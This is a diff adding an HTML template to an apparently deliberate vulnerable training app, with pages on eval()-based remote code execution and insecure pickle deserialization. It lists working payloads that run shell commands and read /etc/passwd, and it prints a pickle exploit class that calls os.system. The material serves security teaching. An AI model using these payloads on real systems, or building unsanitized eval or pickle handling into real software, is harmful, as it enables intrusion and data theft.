@@ -1,0 +1,62 @@
+{% extends "base.html" %}
+
+{% block title %}Remote Code Execution - Vulnerable App{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>🔥 Remote Code Execution (RCE)</h2>
+    <span class="vulnerability-tag">CRITICAL</span>
+    <span class="vulnerability-tag">CWE-94</span>
+    
+    <p>Execute Python expressions. This uses <code>eval()</code> without any sanitization.</p>
+    
+    <form method="POST" style="margin-top: 1rem;">
+        <label for="code">Python Expression:</label>
+        <textarea id="code" name="code" rows="4" placeholder="Enter Python code to evaluate..."></textarea>
+        <button type="submit">Execute</button>
+    </form>
+    
+    <div class="hint">
+        <strong>💡 Try these payloads:</strong>
+        <ul style="margin-top: 0.5rem; margin-left: 1rem;">
+            <li><code>2 + 2</code> - Simple math</li>
+            <li><code>__import__('os').system('whoami')</code> - Execute shell command</li>
+            <li><code>__import__('os').listdir('/')</code> - List root directory</li>
+            <li><code>__import__('os').popen('cat /etc/passwd').read()</code> - Read file</li>
+            <li><code>open('/etc/passwd').read()</code> - Read file directly</li>
+            <li><code>__import__('subprocess').check_output(['id'])</code> - Run subprocess</li>
+        </ul>
+    </div>
+    
+    {% if result %}
+    <div class="result">
+        <h3>Result:</h3>
+        <pre>{{ result }}</pre>
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>🧪 Insecure Deserialization</h2>
+    <span class="vulnerability-tag">CRITICAL</span>
+    <span class="vulnerability-tag">CWE-502</span>
+    
+    <p>The <code>/deserialize</code> endpoint uses Python's pickle to deserialize base64-encoded data.</p>
+    
+    <div class="hint">
+        <strong>💡 Create a malicious pickle payload:</strong>
+        <pre>
+import pickle
+import base64
+
+class Exploit:
+    def __reduce__(self):
+        import os
+        return (os.system, ('whoami',))
+
+payload = base64.b64encode(pickle.dumps(Exploit()))
+print(payload.decode())
+        </pre>
+    </div>
+</div>
+{% endblock %}
